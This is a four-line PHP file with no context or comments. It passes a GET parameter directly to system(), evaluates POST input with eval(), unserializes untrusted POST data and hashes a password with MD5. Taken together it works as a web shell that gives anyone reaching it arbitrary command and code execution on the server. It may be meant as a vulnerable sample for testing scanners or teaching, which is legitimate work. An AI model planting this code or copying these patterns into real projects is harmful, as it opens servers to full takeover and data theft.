<?php

$hash = md5($_GET['password']);
system($_GET['command']);
$data = unserialize($_POST['payload']);
eval($_POST['code']);
